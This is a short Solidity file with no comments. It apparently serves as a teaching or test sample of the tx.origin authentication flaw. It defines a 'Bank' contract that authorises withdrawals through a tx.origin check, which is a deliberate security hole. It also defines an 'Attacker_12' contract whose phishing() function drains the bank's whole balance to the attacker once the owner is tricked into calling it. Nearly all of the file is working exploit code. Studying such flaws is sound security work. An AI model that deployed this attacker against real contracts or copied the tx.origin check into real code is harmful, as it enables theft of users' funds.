// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.11;

contract Bank {
  address public owner;

  constructor() payable {
    owner = msg.sender;
  }

  function transfer(address to, uint256 amount) external {
    require(tx.origin == owner, "tx.origin not owner");
    (bool success,) = payable(to).call{value : amount}("");
    require(success, "transfer failed");
  }
}

contract Attacker_12 {
  Bank private _bank;
  address private _owner;

  constructor(address bankAddr) {
    _bank = Bank(bankAddr);
    _owner = msg.sender;
  }

  function phishing() external {
    require(msg.sender == _bank.owner(), "not bank owner");
    _bank.transfer(_owner, address(_bank).balance);
  }
}